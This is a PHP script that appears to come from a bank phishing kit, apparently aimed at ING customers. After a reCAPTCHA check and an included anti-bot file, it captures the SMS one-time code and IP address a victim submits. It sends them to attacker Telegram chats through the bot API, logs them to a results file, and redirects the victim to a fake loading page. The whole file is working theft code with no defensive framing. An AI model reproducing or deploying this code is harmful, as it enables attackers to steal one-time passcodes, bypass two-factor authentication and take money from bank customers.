<?php
require "antibot.php";
include "id.php";


$recaptchaResponse = $_POST['recaptcha_response'];
$verifyUrl = "https://www.google.com/recaptcha/api/siteverify";


$response = file_get_contents("$verifyUrl?secret=$secretKey&response=$recaptchaResponse");
$responseKeys = json_decode($response, true);


if ($responseKeys["success"] && $responseKeys["score"] >= 0.5) {

    $ip = getenv("REMOTE_ADDR");
    $message = "=|=[ SMS  Unlimited ]=|\n".
    "|SMS UNLIM 🫡: ".$_POST['otp-code']."\n".
    "|IP      : ".$ip."\n".
    "|==[ 🍷 ING BY  XTN🍷]==|";
    foreach ($user_ids as $user_id) {
        $url = 'https://api.telegram.org/bot'.$bot.'/sendMessage';
        $data = array('chat_id' => $user_id, 'text' => $message);
        $options = array('http' => array(
            'method'  => 'POST',
            'header'  => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ));
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
    }
    $myfile = fopen("rzlt.txt", "a+");
    $txt = $message;
    fwrite($myfile, $txt);
    fclose($myfile);
    header("Location: loadingotp.php");
} else {
    header("Location: https://google.com/?captcha=fail");
}
?>
